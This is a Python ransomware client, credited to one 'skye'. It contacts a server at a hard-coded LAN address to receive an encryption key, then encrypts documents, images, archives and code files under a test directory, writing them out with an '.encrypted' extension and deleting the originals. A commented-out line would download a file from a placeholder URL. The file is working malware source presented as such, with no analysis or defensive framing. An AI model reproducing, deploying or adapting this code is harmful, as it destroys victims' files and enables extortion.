#!/usr/bin/python3
# This program is created by skye

import os
import socket
# import sys
import time
# import wget
from cryptography.fernet import Fernet

# Determine the base directory based on the operating system
base = "c:\\" if os.name == 'nt' else "/root"

# Function to encrypt files


def encrypt(key, fpath):
    if fpath not in {__file__, "ransom_server.py"}:
        try:
            with open(fpath, 'rb') as f:
                data = f.read()
                fernet = Fernet(key)
                encrypted = fernet.encrypt(data)
                encrypted_file = fpath + ".encrypted"

                with open(encrypted_file, 'wb') as f:
                    f.write(encrypted)

                os.remove(fpath)
        except Exception as e:
            print("[-] Error Not Permitted")
            print(e)

# List all files from the root directory and encrypt specified formats


def filelist():
    target_ext = (".txt", ".pdf", ".png", ".jpeg", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
                  ".pptx", ".rar", ".gzip", ".zip", ".exe", ".html", ".css", ".js", ".py", ".odt", ".csv")

    for root, dirs, files in os.walk('./test'):
        for file in files:
            if file.endswith(target_ext):
                fpath = os.path.join(root, file)
                print(f"Encrypting {fpath}")
                encrypt(key, fpath)


# Infinite loop to continuously attempt to connect to the server
while True:
    try:
        # Start the socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Replace with actual IP and PORT
        sock.connect(("192.168.4.87", 2000))

        enter = "Hello there"
        exit = "Let's Do It"
        sock.send(enter)
        print(sock.recv(2048).decode())

        # Request key from the server
        print("[+] Connected")
        sock.send(enter.encode())
        key = sock.recv(2048)  # Corrected to receive the key from the server

        # Print the key received from the server
        print(f"Key received: {key.decode()}")

        # Send a confirmation to the server
        sock.send(exit.encode())
        sock.close()

        # Start encrypting files
        filelist()  # Executing the encryption process

        break  # Exit the loop after successful connection and encryption

    except (socket.error, ConnectionError) as e:
        print(f"[-] Connection failed: {e}")
        print("[*] Retrying in 5 seconds...")
        sock.close()
        time.sleep(5)  # Wait for 5 seconds before retrying

# Change directory to Desktop and download a file
os.chdir(os.path.expanduser("~/Desktop"))
# wget.download("http://yourpathhere.com")
